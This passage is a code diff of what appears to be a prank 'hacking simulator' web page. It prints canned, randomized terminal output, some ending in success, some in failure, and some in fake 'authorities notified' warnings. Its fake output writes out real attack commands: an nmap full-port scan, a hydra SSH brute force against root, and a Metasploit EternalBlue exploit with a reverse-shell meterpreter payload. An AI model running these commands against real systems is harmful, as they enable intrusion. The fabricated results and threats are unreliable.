+100666/rw-rw-rw-  1234  fil   2024-06-15      secret.txt
+100666/rw-rw-rw-  5678  fil   2024-06-15      passwords.txt
+100666/rw-rw-rw-  9012  fil   2024-06-15      config.ini
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+$ python3 server.py
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://${userIP}:5000
+Press CTRL+C to quit
+[2024-06-15 12:46:12] "GET / HTTP/1.1" 200 -
+[2024-06-15 12:46:15] "GET /favicon.ico HTTP/1.1" 404 -
+[2024-06-15 12:46:20] "GET /admin HTTP/1.1" 200 -
+[2024-06-15 12:46:25] "POST /login HTTP/1.1" 302 -
+[2024-06-15 12:46:30] "GET /dashboard HTTP/1.1" 200 -
+[2024-06-15 12:46:35] "GET /logout HTTP/1.1" 200 -
+[2024-06-15 12:46:40] "GET /files HTTP/1.1" 200 -
+[2024-06-15 12:46:45] "POST /upload HTTP/1.1" 200 -
+[2024-06-15 12:46:50] "GET /download HTTP/1.1" 200 -
+
+$ exit
+logout
+
+${randomItem(successMessages)}
+🔑 Password: ${password}
+📁 Files: ${files}
+📂 Secret: "${secret}"
+✅ SYSTEM COMPROMISED!
+🔥 Session ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}
+🕒 Time Elapsed: ${Math.floor(60 + Math.random() * 120)} seconds
+📊 Data Extracted: ${Math.floor(100 + Math.random() * 900)} MB
+🌐 Backdoor Installed: ${ip}:${getRandomPort()}`;
+    }
+
+    if (type === 'fail') {
+        // ==============================================
+        // FAIL OUTPUT - 200+ LINES
+        // ==============================================
+        output += `[INFO] Starting APK Modder v3.2.0
+[INFO] Target APK: target.apk
+[ERROR] Target APK not found!
+[ERROR] File not found: target.apk
+[ERROR] Please provide a valid APK file
+[ERROR] Exiting...
+[ERROR] Error code: 404
+[ERROR] Stack trace:
+[ERROR]   at com.example.APKModder.main(APKModder.java:156)
+[ERROR]   at java.lang.reflect.Method.invoke(Method.java:498)
+[ERROR]   at java.lang.invoke.MethodHandle.invokeWithArguments(MethodHandle.java:627)
+
+$ nmap -sV -p- ${ip}
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
+Nmap scan report for ${ip}
+Host is up (0.005s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE     VERSION
+${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
+${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
+${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
+${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ hydra -l root -P password.txt ssh://${ip}
+Hydra v9.5 (c) 2024 by van Hauser/THC
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
+[ERROR] Connection refused
+[ERROR] Target unreachable
+[ERROR] All ports closed
+[ERROR] Authentication failed
+[ERROR] Access denied
+[ERROR] Permission denied
+[ERROR] Target system patched
+[ERROR] Exploit blocked
+[ERROR] Firewall rule blocked connection
+[ERROR] EDR detected attack
+[ERROR] Connection lost
+[ERROR] Target unreachable
+[ERROR] Access denied
+[ERROR] Permission denied
+[ERROR] Security breach detected
+[ERROR] Intrusion detected
+[ERROR] System logging your activity
+[ERROR] Authorities notified
+[ERROR] Your IP has been logged: ${userIP}
+[ERROR] Attempting to trace...
+[ERROR] Trace complete
+[ERROR] Location: Unknown
+
+$ msfconsole -q
+msf6 > use exploit/windows/smb/eternalblue
+msf6 exploit(windows/smb/eternalblue) > set RHOSTS ${ip}
+RHOSTS => ${ip}
+msf6 exploit(windows/smb/eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/eternalblue) > set LHOST ${userIP}
+LHOST => ${userIP}
+msf6 exploit(windows/smb/eternalblue) > run
+
+[*] Started reverse TCP handler on ${userIP}:4444 
+[*] ${ip}:445 - Connecting to target for exploitation.
+[ERROR] Connection timed out
+[ERROR] Target not responding
+[ERROR] Exploit failed
+[ERROR] Payload rejected
+[ERROR] Shellcode injection failed
+[ERROR] EDR blocked the attack
+[ERROR] Firewall rule blocked connection
+[ERROR] Authentication failed
+[ERROR] Access denied
+[ERROR] System compromised... NOT
+[ERROR] You have been detected
+[ERROR] Trace in progress...
+[ERROR] IP logged
+[ERROR] Authorities notified
+[ERROR] Warning: Your system is being tracked
+
+$ exit
+logout
+
+❌ HACK FAILED!
+⚠️ Target detected your activity
+🔒 All ports blocked
+🚫 Access denied
+📡 Your IP: ${userIP} has been logged
+⏰ Time Elapsed: ${Math.floor(30 + Math.random() * 60)} seconds`;
+    }
+
+    if (type === 'caught') {
+        // ==============================================
+        // CAUGHT OUTPUT - 200+ LINES
+        // ==============================================
+        output += `[INFO] Starting APK Modder v3.2.0
+[INFO] Target APK: target.apk
+[ALERT] WARNING: Unauthorized access detected
+[ALERT] System logging your activity
+[ALERT] Firewall blocking all ports
+[ALERT] Security breach detected
+[ALERT] All ports closed
+[ALERT] Exploit failed
+[ALERT] Payload rejected
+[ALERT] Shellcode injection failed
+[ALERT] EDR blocked the attack
+[ALERT] Firewall rule blocked connection
+[ALERT] Connection refused
+[ALERT] Authentication failed
+[ALERT] Access denied
+[ALERT] System compromised... NOT
+[ALERT] You have been detected
+[ALERT] Trace in progress...
+[ALERT] IP logged
+[ALERT] Authorities notified
+[ALERT] Your system is being tracked
+[ALERT] Close this browser immediately
+[ALERT] RUN!
+[ALERT] Your location: ${userIP}
+[ALERT] ISP: Unknown
+[ALERT] Device: Android
+[ALERT] OS: Android 14
+
+$ nmap -sV -p- ${ip}
+[ALERT] WARNING: Unauthorized access detected
+[ALERT] System logging your activity
+[ALERT] Firewall blocking all ports
+[ALERT] Security breach detected
+[ALERT] All ports closed
+[ALERT] Exploit failed
+[ALERT] Payload rejected
+[ALERT] Shellcode injection failed
+[ALERT] EDR blocked the attack
+[ALERT] Firewall rule blocked connection
+[ALERT] Connection refused
+[ALERT] Authentication failed
+[ALERT] Access denied
+[ALERT] System compromised... NOT
+[ALERT] You have been detected
+[ALERT] Trace in progress...
+[ALERT] IP logged
+[ALERT] Authorities notified
+[ALERT] Your system is being tracked
+[ALERT] Close this browser immediately
+[ALERT] RUN!
+
+🚨 CAUGHT!
+👮 Authorities notified
+📍 IP traced: ${userIP}
+🔒 All connections blocked
+💀 System compromised... NOT!
+⏰ Time Elapsed: ${Math.floor(20 + Math.random() * 40)} seconds`;
+    }
+
+    if (type === 'tryagain') {
+        // ==============================================
+        // TRY AGAIN OUTPUT - 200+ LINES
+        // ==============================================
+        output += `[INFO] Starting APK Modder v3.2.0
+[INFO] Target APK: target.apk
+[INFO] Analyzing APK structure...
+[INFO] Decompiling APK...
+[INFO] APK decompiled successfully
+[INFO] Searching for license validation...
+[ERROR] License validation not found
+[ERROR] APK may be already patched
+[ERROR] Exploit incomplete
+[ERROR] System rebooting
+[ERROR] All ports closed
+[ERROR] Authentication failed
+[ERROR] Access denied
+[ERROR] Try again later
+[ERROR] System patched
+[ERROR] Exploit blocked
+[ERROR] Connection lost
+[ERROR] Target unreachable
+[ERROR] Access denied
+[ERROR] Permission denied
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+[ERROR] Try again
+
+$ exit
+logout
+
+🔄 TRY AGAIN!
+⚠️ System not ready
+⏳ Target unreachable
+🔁 Retry your hack attempt
+💡 Tip: Try a different target or check your connection
+⏰ Time Elapsed: ${Math.floor(10 + Math.random() * 30)} seconds`;
+    }
+
+    return output;
+}
 
         // Start hack function
         function startHack() {
-            const target = hackTarget.value;
-            const results = ['success', 'success', 'success', 'fail', 'caught', 'tryagain'];
-            const result = randomItem(results);
+    const target = hackTarget.value;
+    const results = ['success', 'success', 'success', 'fail', 'caught', 'tryagain'];
+    const result = randomItem(results);
 
-            hackOutput.textContent = '';
-            hackOutput.style.color = '#66ff99';
+    hackOutput.textContent = '';
+    hackOutput.style.color = '#66ff99';
 
-            const lines = getResultOutput(result, target).split('\n');
-            let lineIndex = 0;
+    const lines = getResultOutput(result, target).split('\n');
+    let lineIndex = 0;
 
-            function typeLine() {
-                if (lineIndex < lines.length) {
-                    hackOutput.textContent += lines[lineIndex] + '\n';
-                    hackOutput.scrollTop = hackOutput.scrollHeight;
-                    lineIndex++;
-                    const delay = lines[lineIndex] && lines[lineIndex].includes('$') ? 100 : 30;
-                    setTimeout(typeLine, delay);
-                } else {
-                    // Final result color
-                    if (result === 'success') {
-                        hackOutput.style.color = '#00ff41';
-                    } else if (result === 'fail') {
-                        hackOutput.style.color = '#ff4444';
-                    } else if (result === 'caught') {
-                        hackOutput.style.color = '#ffaa00';
-                    } else {
-                        hackOutput.style.color = '#66ff99';
-                    }
-                }
+    // Total duration: 1-3 minutes (60000-180000ms)
+    const totalDuration = 60000 + Math.random() * 120000;
+    const totalLines = lines.length;
+    const minDelay = 100;
+    const maxDelay = 1200;
+
+    function getDelay() {
+        return minDelay + Math.random() * (maxDelay - minDelay);
+    }
+
+    function typeLine() {
+        if (lineIndex < lines.length) {
+            hackOutput.textContent += lines[lineIndex] + '\n';
+            hackOutput.scrollTop = hackOutput.scrollHeight;
+            lineIndex++;
+
+            // Show progress every 10 lines
+            if (lineIndex % 10 === 0 || lineIndex === 1 || lineIndex === lines.length - 1) {
+                const progress = Math.min(Math.round((lineIndex / totalLines) * 100), 100);
+                hackOutput.textContent += `[PROGRESS] ${progress}% complete\n`;
             }
 
-            startHackBtn.disabled = true;
-            startHackBtn.textContent = '⏳ HACKING...';
-            typeLine();
-
-            setTimeout(() => {
-                startHackBtn.disabled = false;
-                startHackBtn.textContent = '🚀 START HACK';
-            }, 15000);
+            const delay = getDelay();
+            setTimeout(typeLine, delay);
+        } else {
+            if (result === 'success') {
+                hackOutput.style.color = '#00ff41';
+                hackOutput.textContent += '\n🎉 HACK COMPLETED SUCCESSFULLY! 🎉\n';
+            } else if (result === 'fail') {
+                hackOutput.style.color = '#ff4444';
+                hackOutput.textContent += '\n❌ HACK FAILED! ❌\n';
+            } else if (result === 'caught') {
+                hackOutput.style.color = '#ffaa00';
+                hackOutput.textContent += '\n🚨 YOU HAVE BEEN CAUGHT! 🚨\n';
+            } else {
+                hackOutput.style.color = '#66ff99';
+                hackOutput.textContent += '\n🔄 TRY AGAIN! 🔄\n';
+            }
+            startHackBtn.disabled = false;
+            startHackBtn.textContent = '🚀 START HACK';
         }
+    }
+
+    startHackBtn.disabled = true;
+    startHackBtn.textContent = '⏳ HACKING...';
+    typeLine();
+}
 
         // Clear hack output
         function clearHack() {
